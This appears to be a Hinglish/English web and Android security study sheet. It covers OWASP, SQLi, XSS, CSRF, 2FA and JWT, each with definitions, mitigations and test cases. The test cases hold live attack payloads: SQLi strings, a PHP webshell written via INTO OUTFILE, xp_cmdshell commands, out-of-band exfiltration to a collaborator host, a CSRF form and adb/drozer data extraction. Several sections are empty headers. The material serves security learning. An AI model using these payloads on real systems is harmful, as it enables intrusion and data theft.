Web Fundamentals

01OWASP Top 10 (2021)

Definition
OWASP Top 10 is the industry-standard list of the 10 most critical web application security risks, updated every ~3-4 years. 2021 edition: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable & Outdated Components, A07 Identification & Authentication Failures, A08 Software & Data Integrity Failures, A09 Security Logging & Monitoring Failures, A10 SSRF.
Impact
These 10 classes cause the majority of real-world breaches — data theft, account takeover, RCE, ransomware. A01 (Access Control) alone covers IDOR, missing authz, privilege escalation.
Mitigation (5 points)
  • Access control: deny-by-default, object/function-level checks server-side.
  • Cryptography: strong algorithms (AES-256-GCM, Argon2/bcrypt), proper key management.
  • Injection: parameterized queries, output encoding, allowlist validation.
  • Patch management: track and update third-party components (SCA tools).
  • Logging/monitoring: log auth events, alert on anomalies, SIEM integration.
Test Cases (Hinglish)
  • Har API endpoint par role change karke (normal user → admin) request bhejo aur dekho kya access milta hai.
  • Login form par ' OR 1=1-- daalo — injection check.
  • Password field mein weak hash (MD5) detect karo — crypto failure check.
  • Response headers dekho — HSTS, CSP missing? (security misconfig).
  • Version disclosure (Server header, error pages) se outdated components pata karo.
Real-world Scenario
E-commerce app: user apne order ID ko 1001 → 1002 change karke doosre customer ka data dekh leta hai — classic A01 Broken Access Control / IDOR.

02CIA Triad

Definition
CIA is the core security model: Confidentiality — data sirf authorized logon ko accessible ho; Integrity — data accurate aur unmodified rahe; Availability — systems aur data jab zaroorat ho tab available rahein. Security controls ko in teeno ke against measure karte hain.
Impact
Confidentiality breach = data leak; Integrity breach = tampered transactions/false data; Availability breach = DoS, business downtime. Ek attack multiple pillars ko hit kar sakta hai (e.g., SQLi = confidentiality + integrity).
Mitigation (5 points)
  • Confidentiality: encryption at rest & in transit, access control, least privilege.
  • Integrity: hashing, digital signatures, audit logs, input validation.
  • Availability: redundancy, load balancing, DDoS protection, backups.
  • Defense in depth: WAF + patching + monitoring together.
  • Regular DR/BCP testing to ensure availability guarantees hold.
Test Cases (Hinglish)
  • Kisi sensitive endpoint par bina token request karo — confidentiality check.
  • Bank balance update karke response compare karo (double-spend) — integrity check.
  • Server par SYN flood / slowloris chalakar availability test karo (authorized scope mein).
  • Network traffic sniff karo (Wireshark) — data plaintext hai? (confidentiality).
  • File hash change karke app detect karta hai ya nahi — integrity check.
Real-world Scenario
Ransomware attack: files encrypt ho jati hain (confidentiality broken), backup delete (availability broken), aur attacker data leak karne ki dhamki deta hai — teeno pillars ek saath fail.

03AAA — Authentication, Authorization, Accounting

Definition
Authentication = "Aap kaun ho?" (verify identity — password, OTP, biometric). Authorization = "Aap kya kar sakte ho?" (permissions/roles). Accounting = "Aapne kya kiya?" (logging, auditing, billing, session tracking). SaaS, VPN (RADIUS/TACACS+), aur enterprise apps mein yeh teen layers mandatory hain.
Impact
AuthN failure → impersonation; AuthZ failure → IDOR/privilege escalation; Accounting failure → attacks undetected, compliance (PCI-DSS, SOX) failure, no forensic trail.
Mitigation (5 points)
  • AuthN: MFA, secure password storage (Argon2/bcrypt), session rotation.
  • AuthZ: role-based access control, server-side checks on every request.
  • Accounting: centralized logging (who/what/when/where), log integrity (WORM/immutable).
  • Least privilege for both users and service accounts.
  • Periodic access reviews and audit report generation.
Test Cases (Hinglish)
  • Bina login sensitive page kholo — authentication check.
  • User A ke session se User B ka resource access karo — authorization check.
  • Audit log mein login, logout, failed attempts recorded hain? — accounting check.
  • Admin API call normal user se karo — vertical authz check.
  • Delete request ka log check karo — accountability traceable hai?
Real-world Scenario
Banking app: customer login karta hai (AuthN), sirf apne accounts dekh sakta hai (AuthZ), aur har transaction audit log mein jaati hai (Accounting) — regulatory requirement.

04SOP (Same-Origin Policy) & CORS (Cross-Origin Resource Sharing)

Definition
SOP: Browser ka core rule — page sirf apne origin (scheme + host + port) ke resources padh sakta hai; doosre origin ka response read nahi kar sakta (embed kar sakta hai: img, script). CORS: Server voluntarily SOP relax karta hai via Access-Control-Allow-Origin header taaki trusted cross-origin requests allowed ho. SOP attack ko rokti hai; CORS misconfig usko wapas khol deti hai.
Impact
Misconfigured CORS (reflecting any origin, AC-Allow-Credentials:true + wildcard) = attacker's site victim ke logged-in context mein API data (tokens, PII) read kar sakti hai — cross-origin data theft.
Mitigation (5 points)
  • Never reflect arbitrary origins — maintain a strict allowlist of trusted domains.
  • Never use Access-Control-Allow-Origin: * together with credentials.
  • Send Vary: Origin header so caches don't serve wrong ACAO.
  • Keep CORS disabled for sensitive endpoints unless genuinely needed.
  • Validate Origin header server-side; reject null origins.
Test Cases (Hinglish)
  • Request mein Origin: https://evil.com bhejo — kya response mein ACAO: https://evil.com reflect hota hai?
  • Origin: null try karo (iframe sandbox se) — accept hota hai?
  • Credentials header ke saath wildcard ACAO hai? — critical finding.
  • Preflight (OPTIONS) se allowed methods/max-age check karo.
  • Attacker page banao jo victim ke API ko fetch kare — data read hota hai?
Real-world Scenario
Bank API ACAO: * ke saath Access-Control-Allow-Credentials: true deta hai → attacker ki phishing site victim ke logged-in session se balance + transactions read kar leti hai.

05Cookie Attributes (Secure, HttpOnly, SameSite)

Definition
Cookies = client-side session/state storage. Attributes: Secure — sirf HTTPS par bheji jaaye; HttpOnly — JavaScript (`document.cookie`) se access nahi ho sakti (XSS se bachat); SameSite — cross-site requests par cookie nahi bheji jaati (Strict/Lax/None); plus Domain, Path, Expires/Max-Age, __Host-/__Secure- prefix, Partitioned (CHIPS).
Impact
Bina HttpOnly → XSS se session steal; bina Secure → MITM sniffing; SameSite=None bina zaroorat → CSRF attack surface; broad Domain/Path → cookie doosre subdomains par leak.
Mitigation (5 points)
  • Always set Secure; HttpOnly; SameSite=Lax (or Strict) on session cookies.
  • Use __Host- prefix for session cookies (forces Secure + no Domain + root Path).
  • Use SameSite=None ONLY for cross-site needs (OAuth/embedded) and pair with CSRF tokens.
  • Restrict Domain/Path scope to the minimum required.
  • Set short Max-Age and rotate session ID on login/logout.
Test Cases (Hinglish)
  • Set-Cookie headers inspect karo — HttpOnly missing? Secure missing? SameSite missing?
  • Browser console mein document.cookie type karo — session token dikh raha hai? (HttpOnly fail)
  • HTTP (non-TLS) par site kholo — cookie send hoti hai? (Secure fail)
  • Cross-site iframe/form se request bhejo — cookie attach hoti hai? (SameSite test)
  • Subdomain par cookie accessible hai? — Domain attribute check.
Real-world Scenario
Stored XSS mila but cookie HttpOnly hai — attacker cookie nahi le sakta, isliye CSRF token + session token dono HttpOnly + SameSite ke saath rakhe jaate hain.

06Security Headers & HSTS

Definition
HTTP response headers jo browser behavior control karte hain: HSTS (Strict-Transport-Security: max-age=31536000; includeSubDomains; preload) — browser hamesha HTTPS force kare; CSP — kaunsi scripts/sources load hon; X-Frame-Options — clickjacking rokta hai; X-Content-Type-Options: nosniff — MIME sniffing rokta hai; Referrer-Policy; Permissions-Policy.
Impact
Missing HSTS → SSL strip/MITM; missing CSP → XSS fully exploitable; missing XFO → clickjacking; missing nosniff → MIME confusion XSS on file uploads.
Mitigation (5 points)
  • HSTS with includeSubDomains; preload on all HTTPS hosts.
  • CSP: default-src 'self'; object-src 'none'; frame-ancestors 'none' etc.
  • X-Frame-Options: DENY/SAMEORIGIN (or CSP frame-ancestors).
  • X-Content-Type-Options: nosniff on all responses.
  • Referrer-Policy: no-referrer / strict-origin-when-cross-origin.
Test Cases (Hinglish)
  • Har response ka header set check karo — HSTS, CSP, XFO, nosniff present hain?
  • HTTP par site open karo — HTTPS par auto-redirect hota hai? (HSTS test)
  • CSP policy mein 'unsafe-inline' ya *.cdn.com loose hai?
  • Page ko iframe mein load karo — load hota hai? (clickjacking check)
  • File upload response ko HTML ke roop mein render karo — MIME sniffing hota hai?
Real-world Scenario
HSTS preload list mein domain submit karne ke baad bhi subdomain HTTP par serve ho raha hai → attacker SSL-strip karke credentials capture karta hai.

07Encoding vs Encryption vs Hashing

Definition
Encoding (Base64, URL, HTML): data ko ek format se doosre mein convert karna — reversible without any key, secrecy ka koi intent nahi. Encryption (AES, RSA): data ko key ke saath scramble karna — reversible WITH key, secrecy ke liye. Hashing (SHA-256, bcrypt): data ko fixed-size digest mein convert karna — one-way, irreversible by design, integrity aur password storage ke liye.
Impact
Base64 se "encrypt" karna (devs ki common galti) → data instantly readable; unsalted/weak hashes → rainbow table se crack; plaintext password storage → full account compromise on DB leak.
Mitigation (5 points)
  • Use encoding ONLY for data transfer/representation, never for security.
  • Use encryption for confidentiality (data at rest/in transit) with strong key management.
  • Use salted slow hashes (bcrypt/Argon2/scrypt) for passwords — never MD5/SHA1/plain SHA-256 for secrets.
  • Use hashing (SHA-256/384) for integrity verification of files/software.
  • HMAC with secret key for message authenticity.
Test Cases (Hinglish)
  • Application mein Base64-encoded password mila? Decode karke verify karo — plaintext expose hota hai?
  • DB dump mein password hash hai? hashcat -m 0 se crack karke dekho (MD5 weak?).
  • API token URL-encoded hai? — encoding vs security confusion check.
  • Two same passwords ka hash same hai? — salt missing ka proof.
  • Encrypted file ko bina key decrypt karne ki koshish karo — strong algorithm use ho raha hai?
Real-world Scenario
Dev ne passwords Base64 karke DB mein store kiye — breach mein 5 lakh hashes instantly decoded, sab accounts compromised. Fix: bcrypt + salt.

08Symmetric vs Asymmetric Encryption + Strong/Weak Ciphers

Definition
Symmetric (AES-256, ChaCha20): encrypt aur decrypt ke liye same key — fast, bulk data ke liye. Asymmetric (RSA-2048+, ECDSA, ECDH): key pair (public + private) — slow, key exchange/digital signatures ke liye. TLS dono use karta hai: asymmetric se symmetric key exchange, phir AES se data. Weak ciphers: DES, 3DES, RC4, ECB mode, MD5, SHA-1 (deprecated); Strong: AES-256-GCM, ChaCha20-Poly1305, RSA-2048+, ECC (P-256+), SHA-256/384, Argon2/bcrypt.
Impact
Weak cipher (RC4/DES) → practical cryptanalysis; MD5 → collision attacks (forged certs, tampered files); ECB → pattern leak (logo/photo recognizable); hardcoded keys → full decryption.
Mitigation (5 points)
  • Use AES-256-GCM / ChaCha20-Poly1305 for symmetric encryption (authenticated modes).
  • Use RSA-2048+ or ECC P-256+ for asymmetric operations.
  • Disable legacy protocols/ciphers (SSLv3, TLS 1.0/1.1, RC4, 3DES) server-side.
  • Use HMAC + key derivation (PBKDF2/Argon2) properly; unique IV/nonce per encryption.
  • Key management: HSM/KMS, key rotation, never hardcode keys in source.
Test Cases (Hinglish)
  • SSL/TLS scan karo (testssl.sh / Qualys SSL Labs) — weak cipher supported hai?
  • ECB mode use ho raha hai? Same plaintext blocks → same ciphertext blocks detect karo.
  • APK/jar mein hardcoded AES key search karo (strings / jadx).
  • MD5/SHA-1 hash use ho raha hai? — weak hash check.
  • Same IV reuse detect karo — two ciphertexts XOR karke pattern dekho.
Real-world Scenario
Legacy banking app sirf TLS 1.0 + RC4 support karta hai → attacker passive sniffing se session decrypt kar leta hai (BEAST/POODLE class attacks).

09Session Management & Why Cookies/Cache Are Used

Definition
HTTP stateless hai — har request alag. Session management server par state (session store/Redis/DB) rakhta hai aur client ko ek random session ID cookie mein deta hai. Cookies isliye use hote hain kyunki browser unhe har request par automatically bhejta hai. Cache (browser/CDN/Redis) repeated data store karta hai taaki speed badhe aur bandwidth bache.
Impact
Predictable/weak session ID → session hijack; no expiry → stale sessions; fixation → attacker-controlled session; cache-sensitive data (tokens in cache) → data leak to shared machines.
Mitigation (5 points)
  • Generate session IDs with CSPRNG, high entropy (128+ bits).
  • Set Secure, HttpOnly, SameSite cookies with reasonable Max-Age.
  • Rotate session ID on login, privilege change; invalidate on logout/password change.
  • Server-side expiry + idle timeout + absolute timeout.
  • Never cache sensitive responses: Cache-Control: no-store on private data.
Test Cases (Hinglish)
  • Login se pehle aur baad ka session ID compare karo — rotation hoti hai?
  • Session ID character set check karo — predictable pattern (timestamp/username)?
  • Logout ke baad session token reuse karo — ab bhi valid hai?
  • Session ko 30 min idle chhodo — expire hota hai?
  • Response headers Cache-Control: no-store missing hain sensitive pages par?
Real-world Scenario
Shared cybercafe PC: user logout karta hai but session server par 24hr valid rehta hai → agla user purana session cookie inject karke account access kar leta hai.

10Authentication vs Authorization — Implementation Order

Definition
Order matter karta hai: pehle Authentication (verify who you are), phir Authorization (check what you can do). Interview example: controller mein pehle View create/load ho jata hai, baad mein role check hota hai — isme sensitive data render hone se pehle check hona chahiye. Correct pattern: authN → authZ check → business logic → view render.
Impact
View-before-check → unauthorized users ko data/UI dikh jata hai; authZ check bhoolna → IDOR; authN ke baad authZ missing → any logged-in user admin functions access karta hai (BFLA).
Mitigation (5 points)
  • Apply authentication middleware/attribute before controllers execute.
  • Apply authorization checks (role/permission) before ANY data access or view creation.
  • Use framework-level guards (e.g., @PreAuthorize, AuthorizeAttribute) — not manual scattered checks.
  • Deny-by-default: if no role matches, reject.
  • Test negative paths: unauthenticated + authenticated-unauthorized + authorized.
Test Cases (Hinglish)
  • Bina login page source/network tab se data aata hai? (pehle view ban raha hai?)
  • Normal user ko admin dashboard URL directly daal kar dekho — access milta hai?
  • Response time compare karo: unauthorized request par data processing ho rahi hai? (timing side-channel)
  • Role parameter (role=admin) POST karke dekho — server use karta hai?
  • Horizontal test: user A ke dashboard mein user B ka resource reference daalo.
Real-world Scenario
ASP.NET app: var order = db.Orders.Find(id); View(order); — phir check karta hai "if(user.Id != order.UserId) deny". Fix: check pehle karo, warna data load hi mat karo.

11Monolith vs Microservices + API Gateway

Definition
Monolith: ek hi deployable unit mein sab (UI, business logic, DB). Microservices: chhote independent services, apni DB ke saath, APIs se communicate. API Gateway: microservices ke saamne single entry point — routing, authentication, rate limiting, request validation, logging, aggregation karta hai.
Impact
Monolith: single point of failure, blast radius bada. Microservices: attack surface bada (har service vulnerable ho sakti hai), service-to-service trust issues, secret sprawl. Gateway misconfig → auth bypass across ALL services.
Mitigation (5 points)
  • Centralize authN/authZ at gateway + re-validate at service level (defense in depth).
  • Service-to-service: mTLS, short-lived tokens, never trust internal network blindly.
  • Secrets via vault (HashiCorp Vault/KMS), not env files committed to git.
  • Gateway: strict input validation, rate limiting per client, request size limits.
  • Network segmentation: internal services not publicly routable.
Test Cases (Hinglish)
  • Gateway ke bypass attempts: direct IP/hostname se service access karo (dns rebinding, Host header).
  • Gateway par rate limit lagao — bypass ho sakta hai (X-Forwarded-For spoof)?
  • Path traversal se doosri service ka route hit karo: /api/../admin.
  • HTTP method confusion: GET/POST/PATCH se auth check bypass hota hai?
  • Har microservice ka apna auth hai? Ek service compromise → doosri accessible?
Real-world Scenario
Fintech: payments service bina auth ke internal network par tha → attacker kisi vulnerable service se pivot karke payments API directly call kar leta hai (gateway bypass).

Injection & Web Attacks

12SQL Injection — Types, Manual Techniques, OOB, Second-Order

Definition
SQLi tab hota hai jab user input directly SQL query mein concatenate hota hai. Types: In-band (error-based + UNION-based — result same response mein), Blind (boolean-based + time-based — no data in response), Out-of-band (OOB) (data DNS/HTTP request ke through attacker server par jata hai), Second-order (malicious input store hota hai, baad mein kisi aur query mein use hota hai). Manual flow: quote test → column count → UNION → DB fingerprint → data dump.
Impact
Data theft (PII/credentials), authentication bypass, data tampering, RCE (xp_cmdshell/INTO OUTFILE), complete DB compromise — OWASP #3, CVSS up to 9.8+.
Mitigation (5 points)
  • Parameterized queries / prepared statements for ALL queries.
  • Stored procedures / ORM with safe APIs; escape user input only as last resort.
  • Least-privilege DB accounts (no DROP/GRANT for app user).
  • Input validation (allowlist) + output encoding for second-order cases.
  • WAF + query-level monitoring as defense in depth, not replacement.
Test Cases (Hinglish)
  • Har input par ' daalo — error aata hai? (error-based)
  • ' OR 1=1-- aur ' OR 1=2-- ke responses compare karo (boolean blind).
  • ORDER BY 1..10 se column count nikaalo, phir UNION SELECT 1,2,3....
  • Time-based: '; IF(1=1) WAITFOR DELAY '0:0:5'-- (MSSQL) / ' AND SLEEP(5)-- (MySQL).
  • OOB: Burp Collaborator DNS se LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.collab.oastify.com\\a')) test karo.
  • Second-order: username mein ' OR 1=1-- register karo, phir profile/search feature use karo.
Real-world Scenario
Ticket booking site ke search par time-based blind SQLi mila → 2 saal ke 4 crore user records (names, emails, password hashes) dump hue. Fix: prepared statements + DB least privilege.

13SQLi Mitigation — Client, Server, DB Levels + Dynamic vs Parameterized Queries

Definition
Dynamic query: string concatenation se query banati hai (SELECT * FROM users WHERE name='"+input+"') — vulnerable. Parameterized query: SQL structure fixed, values placeholders se jaati hain (SELECT * FROM users WHERE name=?) — input kabhi SQL nahi ban sakta. Mitigation har layer par: Client — validation/escaping (sirf UX ke liye, security nahi); Server — parameterized queries, allowlist validation, ORM; Database — least privilege, disable dangerous features (xp_cmdshell), separate accounts per app.
Impact
Dynamic query + special chars allowed (business requirement) = SQLi open door; sirf client-side validation = trivial bypass (Burp se direct request).
Mitigation (5 points)
  • Server-side parameterized queries compulsory — even when special chars are a business requirement.
  • DB: least-privilege accounts, no xp_cmdshell, FILE privileges, network isolation.
  • Client-side: validate format (e.g., email regex) but NEVER trust it for security.
  • Apply escaping/encoding only where parameterization is impossible (dynamic ORDER BY → allowlist column names).
  • Regular DAST/SAST scans + query logging with anomaly alerts.
Test Cases (Hinglish)
  • Search/name field mein '; DROP TABLE users-- daalo — error aata hai? (parameterized test)
  • Special chars requirement wale field (password: ' OR 1=1--) par parameterization test karo.
  • DB user privileges enumerate karo: SELECT current_user;, SELECT is_srvrolemember('sysadmin');
  • ORDER BY / LIMIT / column-name inputs par injection try karo (whitelist missing?).
  • Client validation bypass: Burp Repeater se invalid input direct bhejo.
Real-world Scenario
Business requirement: usernames mein apostrophe allowed. Dev ne input "sanitize" karke concat kiya — attacker ne san''; DROP TABLE-- se bypass kiya. Fix: parameterized query, special chars se koi dikkat nahi hoti.

14SQL Injection to RCE (SQL RCE)

Definition
SQLi se server-level command execution tab possible hai jab DB par high privileges hon: MSSQL — EXEC xp_cmdshell 'whoami'; MySQL — SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php' (needs FILE priv + write dir) ya UDF sys_exec; PostgreSQL — COPY cmd FROM PROGRAM 'id'; Oracle — UTL_HTTP/Java stored procedures. Stacked queries ya OOB techniques se payload deliver hota hai.
Impact
Full server compromise → webshell, data exfiltration, lateral movement, ransomware. Severity: Critical (10.0).
Mitigation (5 points)
  • App DB user ko sirf CRUD privileges do — never sysadmin/DBA/root.
  • Disable xp_cmdshell, FILE privilege, UDF plugin loading.
  • Web root writable by DB user nahi hona chahiye (no INTO OUTFILE).
  • Parameterized queries (SQLi ko root cause se khatam karo).
  • OS hardening + EDR + outbound egress filtering (OOB ko rokne ke liye).
Test Cases (Hinglish)
  • UNION se @@version nikaalo — DB fingerprint (MSSQL/MySQL/Postgres?).
  • MSSQL: '; EXEC xp_cmdshell 'whoami'-- — command output aata hai?
  • MySQL: ' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'-- phir /s.php?0=id.
  • PostgreSQL: '; COPY (SELECT 'id') TO PROGRAM 'id'--.
  • OOB RCE: xp_dirtree '\\attacker\share' se DNS exfil try karo.
Real-world Scenario
Legacy CMS: SQLi + MySQL FILE privilege + webroot writable → attacker ne INTO OUTFILE se webshell daali, phir server se 200GB data exfiltrate kiya. Fix: DB privilege lockdown + parameterization.

15"OR 1=1 Doesn't Work" — Your Next Steps

Definition
Login par ' OR 1=1-- error deta hai, lekin backend ab bhi vulnerable ho sakta hai. Iska matlab hai: query parameterized nahi hai lekin syntax context alag hai, ya input somewhere filter/truncate ho raha hai, ya blind injection hai. Approach systematic honi chahiye.
Impact
Naive tester wahan ruk jata hai aur SQLi miss ho jati hai — jahan vulnerable tha wahan breach ka rasta khula rehta hai.
Mitigation (5 points)
  • Har parameter ko alag se test karo (username, password, remember-me, hidden fields).
  • Error message content analyze karo — DB type aur query structure hint deta hai.
  • Blind techniques shift karo: boolean (' AND 1=1-- vs ' AND 1=2--) aur time-based.
  • Encoding/obfuscation try karo: URL encode, double-encode, %27, case variation, comments /**/.
  • Doosre endpoints par bhi wahi input patterns test karo — login safe ho sakta hai, profile/search vulnerable.
Test Cases (Hinglish)
  • admin' AND '1'='1 vs admin' AND '1'='2 — responses differ? (boolean)
  • ' OR SLEEP(5)-- aur ' AND SLEEP(5)-- — response delay? (time)
  • admin%27, admin%2527 (double encode) — error change hota hai?
  • Error text padho: You have an error in your SQL syntax = MySQL raw concat ka proof.
  • WAF hai? Agar haan, WAF bypass techniques apply karo (comments, chunked, HPP).
Real-world Scenario
Interview scenario: login par OR 1=1 error deta hai kyunki password field WAF se block ho raha hai. Burp se payload ko /*!50000OR*/ 1=1 form mein bhejo → injection works. Lesson: error = door, blocked = window.

16XSS — Types, DOM XSS, Exploitation

Definition
XSS = attacker ka JavaScript victim ke browser mein kisi aur ke context mein chalta hai. Reflected: payload URL/request mein aata hai aur turant reflect hota hai (ek-click). Stored: payload DB mein save hota hai, har visitor ke liye chalta hai (most critical). DOM XSS: server involve nahi hota — JavaScript hi vulnerable sink (innerHTML, document.write, eval, location) par untrusted source (location.hash, postMessage, document.referrer) use karta hai.
Impact
Session theft, account takeover, keylogging, CSRF, phishing, malware drop, defacement, crypto mining — browser ke andar kuch bhi.
Mitigation (5 points)
  • Output encoding context-aware (HTML, attribute, JS, URL, CSS — alag encoding).
  • Input validation allowlist + sanitization libraries (DOMPurify).
  • CSP strict policy (script-src 'nonce-xxx') — XSS ka impact mitigate hota hai.
  • HttpOnly + Secure + SameSite cookies — session theft roko.

20LFI vs RFI vs Directory Traversal vs Directory Listing

Definition
Directory Traversal: path manipulation se filesystem ke bahar ki files read: ../../../../etc/passwd. LFI: server-side include/read function mein local file path inject: ?page=../../etc/passwd, wrappers php://filter/convert.base64-encode/resource=config.php, data://, expect://; log poisoning se RCE. Impact
Source code, configs, credentials read (LFI/traversal); RCE (RFI, log poisoning, LFI+wrappers); sensitive file exposure (listing).

  • Disable directory listing (Options -Indexes / autoindex off).
  • Web server chroot/least privilege, files outside webroot.

Real-world Scenario
Download feature download.php?file= — LFI se .env (DB credentials) read hue → full DB compromise. Fix: file ID mapping + realpath check.

21CRLF Injection

Definition

Search redirect par CRLF → attacker ne Set-Cookie inject karke victim ko attacker-controlled session de diya (session fixation) aur phir account hijack kiya.

31CSRF — Deep Dive (Mitigation, Bypass, Exploitation)

Definition
CSRF: victim ke browser mein authenticated session hota hai; attacker ka page victim ki taraf se cross-site request bhejta hai (form submit, img/fetch). Bina anti-CSRF token ke server action execute kar deta hai. Login CSRF: attacker victim ko attacker ke account mein login karwata hai — victim ki activities attacker ke account mein log hoti hain (defamation/fraud evidence). Mitigation: CSRF tokens, SameSite cookies, double-submit cookies, custom headers. Bypass: token stripping (if not validated), weak token generation, GET-based state change, JSON content-type not checked, SameSite bypass via subdomain/sibling domain, login CSRF is not always blocked.
Impact
State-changing actions bina user ke: password/email change, fund transfer, purchase, account deletion — Medium to High; chains with XSS for full takeover.
Mitigation (5 points)
  • Synchronizer token: random, per-session, server-validated token in every state-changing request (form + custom header).
  • SameSite=Lax/Strict cookies — cross-site requests mein cookie hi na jaye.
  • Verify Origin/Referer headers for state-changing requests (fallback).
  • Re-authentication/OTP for highly sensitive actions (transfer, delete).
  • Never allow state changes via GET; JSON APIs require custom header + content-type check.
Test Cases (Hinglish)
  • CSRF PoC: <form action="https://target/change-email" method="POST"><input name="email" value="h@e.com"></form> auto-submit — action hua?
  • Token validation: token hatao ya badal do — request accept hoti hai? (token stripping)
  • Token reuse: same token multiple requests — per-request validation hai?
  • GET CSRF: https://target/delete?id=5 direct open karo.
  • Login CSRF: login form cross-site submit karo — victim attacker ke account mein login?
  • SameSite test: SameSite=None cookies par CSRF token missing hai?
Real-world Scenario
Banking app mein transfer form bina CSRF token — attacker ne "Free Lottery" page se victim ke account se $5000 transfer karwaya. Fix: CSRF token + SameSite=Strict + OTP for transfers.

32OTP / 2FA / MFA Bypass — All Test Cases

Definition
2FA/MFA = second factor (OTP via SMS/email/app, TOTP, push, biometric). Bypass vectors: response manipulation (2FA flag false), direct endpoint access (step skip), OTP brute force (4-6 digits, no rate limit), OTP reuse, OTP in response/URL, predictable OTP, race condition (parallel requests), null OTP / empty, backup code reuse, session fixation after 2FA, captcha is NOT 2FA (bot protection, not a factor).
Impact
Complete account takeover bypassing the only real protection — Critical in banking/fintech apps.
Mitigation (5 points)
  • Rate limit OTP attempts (e.g., 5 tries, lockout) + exponential backoff per user+IP.
  • OTP: single-use, expiry (60-120s), server-side generated via CSPRNG/TOTP, hashed at rest.
  • Never return OTP in response/headers/URL; never trust client-side 2FA flag.
  • Enforce 2FA re-check on every sensitive action (not just login).
  • Session binding: 2FA token bound to device/session; invalidate sessions on factor change.
Test Cases (Hinglish)
  • Brute: 000000-999999 burp intruder (6-digit, no rate limit?) — 100 tries.
  • Response tamper: "2fa_verified":false → true / remove step param.
  • Skip: 2FA ke baad wala endpoint directly hit karo (dashboard) bina OTP ke.
  • Reuse: valid OTP do baar use karo — second time accept?
  • Race: OTP verify request ko 20 parallel threads mein bhejo (race condition).

33JWT — Test Cases & Vulnerabilities

Definition

Impact
Auth bypass, account takeover, privilege escalation — Critical if verification flawed.
Mitigation (5 points)
  • Use RS256/ES256 (asymmetric) — never HS256 with weak secret; never allow alg:none.
  • Validate: signature, exp/nbf/iss/aud, token type, key id against allowlist.
  • Pin exact algorithm during verification; reject algorithm changes.
  • Keep secret ≥256-bit random; rotate keys; jwks with strict kid handling.
  • Short expiry + refresh tokens + server-side denylist for revocation.
Test Cases (Hinglish)

Real-world Scenario

34OAuth vs OIDC — Differences, Attacks, Validation

Definition

35IDOR / BOLA / BFLA / Privilege Escalation

Definition

36Session Hijacking vs Session Fixation

Definition

39SSRF — Deep Dive (In-band, OOB, via XXE, Sinkhole & WAF)

Definition

48Android Storage / Backup / Logs — Real-Time Exploitation

Definition
Sensitive data galat jagah: SharedPreferences/plaintext DB mein tokens; internal storage files readable (root); external storage (SDCard) — business requirement read/write external storage → use scoped storage, encrypt files, never store auth tokens, random filenames, avoid WRITE_EXTERNAL_STORAGE broad permission; allowBackup=true → adb backup se saara data (DB, prefs) nikal jata hai; logs — Log.d/i mein credentials/OTP; crash reports mein stack with data; exploit real-time: run-as (debuggable) → run-as com.app cat /data/data/com.app/databases/app.db, adb backup restore on attacker device, logcat grep password, memory dump.
Impact
Token/credential theft, offline analysis se data breach, session replay.
Mitigation (5 points)
  • Encrypt at rest (Android Keystore / EncryptedSharedPreferences); secrets never plaintext.
  • allowBackup=false; exclude sensitive files from backup rules.
  • Never log secrets; sanitize crash reports (proguard + no sensitive fields).
  • External storage: scoped storage, no auth material, encrypt files, per-file permissions.
  • Release builds: debuggable=false, minify, remove dev backdoors.
Test Cases (Hinglish)
  • adb shell run-as com.app ls /data/data/com.app/ — data readable?
  • adb backup -f backup.ab com.app — phir abe.jar se extract karke DB/prefs padho.
  • adb logcat | grep -i "password\|token\|otp" — sensitive log?
  • SDCard: app ke files external storage mein plaintext?
  • APK backup rules (backup_rules.xml) check karo — sensitive files excluded?
Real-world Scenario
App ne API token SharedPreferences mein plaintext store kiya + allowBackup=true — attacker backup extract karke token se doosre device par login kar liya. Fix: Keystore encryption + backup off.

49Tapjacking (Android Clickjacking)

Definition
Android version of clickjacking: attacker app victim app ke upar transparent overlay (FLAG_WINDOW_IS_OBSCURED window) rakhti hai — victim invisible button (grant permission, install, approve) par tap karta hai. Also: onFilterTouchEventForSecurity check missing, FLAG_SECURE missing, overlay permission abuse, accessibility service abuse.
Impact
Unauthorized actions: permissions grant, transactions approve, malware install, settings change.
Mitigation (5 points)
  • Set FLAG_SECURE for sensitive screens (blocks screenshots + overlays capture).
  • Implement onFilterTouchEventForSecurity — reject obscured touches.
  • Detect SYSTEM_ALERT_WINDOW / overlay apps at runtime on critical flows.
  • Confirm critical actions with in-app dialog + re-auth/OTP.
  • Screen pinning for payment sessions (optional hardening).
Test Cases (Hinglish)
  • Overlay app banao (TYPE_APPLICATION_OVERLAY) jo victim ke approve button par fake button rakhe — click intercepted?
  • Manifest/activity check: FLAG_SECURE set hai sensitive screens par?
  • onFilterTouchEventForSecurity implemented hai? (smali review)
  • Permission dialog tapjacking: overlay se "Allow" par tap karwao.
  • Accessibility service ke through touch injection test.
Real-world Scenario
Banking app ke payment confirm button par attacker overlay — victim "Claim Reward" par tap karta hai, actually payment approve ho jata hai. Fix: FLAG_SECURE + obscured-touch rejection.

50Drozer — LFI & SQLi Exploitation on Android

Definition
Drozer (MWR) = Android security assessment framework jo device par agent (shell) + PC console use karta hai. Content provider SQLi: run scanner.provider.injection -a com.app → vulnerable providers detect; phir run app.provider.query --uri content://com.app.provider/users --selection "1=1" — union/boolean injection se data dump. File read (LFI via providers): run app.provider.read --uri content://com.app.FileProvider/../../../../etc/hosts — path traversal se local files read (file-based LFI); content:// traversal via %2e%2e. Also: app.activity.info (exported activities), app.broadcast.send (receiver trigger), app.provider.info, scanner.modules.
Impact
Provider SQLi → DB dump (users/tokens); file traversal → source/configs read; exported component abuse → auth bypass.
Mitigation (5 points)
  • Unexport providers / signature permissions (SQLi surface khatam).
  • Parameterize provider queries; validate URIs (canonicalize, reject traversal).
  • FileProvider strict paths.xml; never share root paths.
  • Regular Drozer scans in CI security pipeline.
  • Patch provider code same as web SQLi (parameterized selection).
Test Cases (Hinglish)
  • Setup: device par drozer-agent.apk, PC: adb forward tcp:31415 tcp:31415, drozer console connect.
  • run app.provider.info -a com.app — exported providers list.
  • run scanner.provider.injection -a com.app — SQLi vulnerable provider milega.
  • run app.provider.query --uri content://.../users --projection "* FROM sqlite_master--".
  • File read: run app.provider.read --uri content://com.app.FileProvider/../../../../etc/passwd.
  • Broadcast: run app.broadcast.send --action com.app.intent.ADMIN_ACTION.
Real-world Scenario
